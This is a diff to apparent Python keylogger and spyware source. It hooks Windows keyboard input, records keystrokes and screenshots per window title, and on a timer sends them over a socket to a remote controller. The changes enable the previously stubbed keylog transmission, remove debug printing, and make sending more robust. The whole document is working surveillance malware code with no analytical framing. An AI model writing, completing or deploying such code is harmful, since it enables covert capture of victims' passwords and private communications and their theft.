@@ -166,8 +166,10 @@ def send_keylog():
     global KEY_LOGS
 
     config = init()
-    if config['kts'] and len(KEY_LOGS) > 0:
-        pass
+    if config['kts'] and len(KEY_LOGS) > 0 and ACTIVE:
+        for i in KEY_LOGS.keys():
+            data_send(GLOBAL_SOCKET, str(KEY_LOGS[i]), 'keyloggerLogs')
+        KEY_LOGS = {}
     key_scheduler = sched.scheduler(time.time, time.sleep)
     key_scheduler.enter(config['kt'], 1, send_keylog, ())
     key_scheduler.run()
@@ -177,9 +179,12 @@ def send_screenshot():
     global GLOBAL_SOCKET
     global ACTIVE
     global SCREENSHOT_LOGS
+    global CURRENT_WINDOW_TITLE
 
     config = init()
     if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
+
+        CURRENT_WINDOW_TITLE = ''
         for i in SCREENSHOT_LOGS.keys():
             data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
         SCREENSHOT_LOGS = {}
@@ -239,14 +244,13 @@ class Key(threading.Thread):
         global WINDOW_TITLE_COUNTER
 
         new_window_title = get_window_title()
-        datetime_stamp = get_date_time()
         if CURRENT_WINDOW_TITLE == new_window_title and KEY_LOGS.has_key(WINDOW_TITLE_COUNTER):
                 KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] += log
         else:
             WINDOW_TITLE_COUNTER += 1
             KEY_LOGS[WINDOW_TITLE_COUNTER] = {}
             KEY_LOGS[WINDOW_TITLE_COUNTER]['window_title'] = new_window_title
-            KEY_LOGS[WINDOW_TITLE_COUNTER]['time'] = datetime_stamp
+            KEY_LOGS[WINDOW_TITLE_COUNTER]['time'] = get_date_time()
             KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] = log
             CURRENT_WINDOW_TITLE = new_window_title
 
@@ -254,7 +258,6 @@ class Key(threading.Thread):
         if w_param is not 0x0100:
             return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
         self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))
-        print KEY_LOGS
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
     def start_keylogger(self):
@@ -367,7 +370,10 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
         'session_id': session_id,
         'key': ID,
     }
-    sock.sendall(str(message)+end)
+    try:
+        sock.sendall(str(message)+end)
+    except socket.error:
+        return
 
 
 ###
